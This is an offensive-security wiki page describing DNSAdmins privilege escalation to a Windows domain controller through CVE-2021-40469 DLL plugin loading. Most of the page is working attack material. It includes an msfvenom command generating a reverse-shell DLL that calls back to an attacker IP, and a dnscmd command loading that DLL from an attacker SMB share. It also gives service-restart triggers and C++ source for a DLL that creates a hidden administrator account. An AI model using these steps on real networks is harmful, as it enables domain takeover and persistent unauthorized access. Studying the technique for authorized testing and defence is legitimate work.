# DNSAdmins

## Theory

Members of the built-in DNSAdmin group can read, write, create, delete DNS records (e.g. edit the [wildcard record](../../mitm-and-coerced-authentications/adidns-spoofing.md#manual-record-manipulation) if it already exists). Its members can also [run code via DLL on a Domain Controller operating as a DNS server](https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83) ([CVE-2021-40469](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-40469)).

The attack relies on a DLL injection into the **dns service** running as SYSTEM on the DNS server which most of the time is on a Domain Contoller which in this case implicate a domain compromise.

{% hint style="info" %}
You must be member of the DnsAdmins group to perform this attack.
{% endhint %}

## Practice

{% tabs %}
{% tab title="Exploit - msfvenom" %}
First, generate a DLL to inject

```bash
# Generating the DLL
sudo msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.14.28 LPORT=5566 -f dll > privesc.dll
```

Now we can replace the service's dll

```bash
# Host the DLL on a SMB server or upload it on the target machine
$ sudo smbserver.py MYSHARE /path/to/dll -smb2support

# On the target machine, update the DNS configuration and give it the DLL
PS > dnscmd 10.10.10.169 /config /serverlevelplugindll \\10.10.14.28\TESTLOL\privesc.dll
```

You can know trigger the exploit by restarting the dns service.

```powershell
# You can check if the DLL has been correctly loaded
PS > Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ -Name ServerLevelPluginDll

# Then restart the DNS service (start your listener on attacking machine before)
PS > sc.exe stop dns
PS > sc.exe query dns
PS > sc.exe start dns
```
{% endtab %}

{% tab title="Custom dll" %}
Here is a template to compile your own DLL for DNS service:

{% code title="evildll.cpp" %}
```cpp
#include <windows.h>
#include <stdlib.h>


// Here so I remember how to compile it.
// x86_64-w64-mingw32-gcc -shared -o evil.dll evildll.cpp

extern "C" __declspec(dllexport) int DnsPluginInitialize(PVOID a1, PVOID a2)
{
  system("net.exe user bob Password123 /add");
  system("net.exe localgroup administrators bob /add");
  return 0;
}

extern "C" __declspec(dllexport) int DnsPluginCleanup()
{
  return 0;
}

extern "C" __declspec(dllexport) int DnsPluginQuery(PSTR a1, WORD a2, PSTR a3, PVOID a4)
{
  return 0;
}


BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
        OutputDebugString("DLL_PROCESS_ATTACH");
        break;

    case DLL_THREAD_ATTACH:
        OutputDebugString("DLL_THREAD_ATTACH");
        break;

    case DLL_THREAD_DETACH:
        OutputDebugString("DLL_THREAD_DETACH");
        break;

    case DLL_PROCESS_DETACH:
        OutputDebugString("DLL_PROCESS_DETACH");
        break;
    }

    return TRUE;
}
```
{% endcode %}

Compile it on linux using mingw

```bash
$ x86_64-w64-mingw32-gcc -shared -o evil.dll evildll.cpp
```
{% endtab %}
{% endtabs %}

## References

{% embed url="https://cheatsheet.haax.fr/windows-systems/privilege-escalation/dnsadmins_group/" %}

{% embed url="https://malicious.link/post/2020/compiling-a-dll-using-mingw/" %}
